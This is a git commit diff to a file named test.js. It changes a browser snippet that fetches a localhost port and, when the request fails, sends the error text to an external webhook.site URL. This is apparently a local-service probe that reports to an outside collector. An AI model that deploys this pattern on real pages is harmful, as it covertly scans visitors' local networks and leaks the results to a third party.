2b1396dfd136f34a9f6d5b1ae3e80ba93ffe25a8
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-08-17 12:21:01 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,5 +1,5 @@
 try{
-  await fetch("http://localhost:1024/");
+  await fetch("http://localhost:1024/",{mode:'no-cors'});
 }catch(err){
   fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err);
 }
